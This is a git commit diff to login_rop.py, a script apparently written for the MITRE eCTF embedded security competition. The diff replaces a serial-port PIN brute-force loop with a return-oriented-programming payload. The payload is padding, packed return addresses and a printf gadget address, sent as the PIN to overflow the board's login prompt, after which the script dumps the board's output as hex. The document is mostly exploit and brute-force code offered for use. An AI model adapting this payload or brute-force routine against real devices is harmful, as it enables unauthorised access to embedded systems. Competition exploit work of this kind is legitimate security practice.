70c533a4e48f99cdf971ad5cbacdd5804e1f10f9
manoj <manoj549t@gmail.com>
2019-03-07 01:30:01 +0000

    work in progress

--- login_rop.py
+++ login_rop.py
@@ -1,18 +1,14 @@
 from tqdm import tqdm
 import sys
 import serial
-import argparse
 
-parser = argparse.ArgumentParser(description='Brute force logins for the MITRE eCTF')
-parser.add_argument('username', metavar='username', help='The username')
-parser.add_argument('--start', type=int, default=0, help='The starting pin')
+arg1 = '\x88\xb3\x06\x04'
+# rop1 = '\xec\x0c\x01\x04\x00\x00\x00\x00'
+rop1 = 8*'C'
+printf = '\x80\xe2\x04\x04'
+username = "demo"
+pin = 14*'A' + arg1 + 12*'B'+ rop1 + printf
 
-args = parser.parse_args()
-
-#starting_location = args.start
-#pin_range = 100000000
-#username = args.username
-pin_length = 8
 username_prompt = "Enter your username: "
 pin_prompt = "Enter your PIN: "
 mesh_prompt = "mesh> "
@@ -37,15 +33,10 @@ print("We have reached the initial starting point.")
 print("If you are hanging here you might want to restart the board")
 recv_until(username_prompt, ser)
 print("Starting to brute force logins!")
-for i in tqdm(range(starting_location, pin_range)):
-    pin = max(pin_length - len(str(i)), 0)*"0" + str(i)
-    ser.write((username + "\n").encode("utf-8"))
-    #ser.write((pin + "\n").encode("utf-8"))
-    #prompt = recv_until_either(username_prompt, mesh_prompt, ser)
-    #if mesh_prompt in prompt:
-        #print("")
-        #print("Successful login!")
-        #print("Username: {0}".format(username))
-        #print("PIN: {0}".format(pin))
-        #break
-
+ser.write((username + "\n").encode("utf-8"))
+ser.write((pin + "\n").encode("utf-8"))
+print("starting to read serial")
+a = ""
+while 1:
+#    print(str(ser.read(1))), end='')
+    print(ser.read(1).hex(), end='')
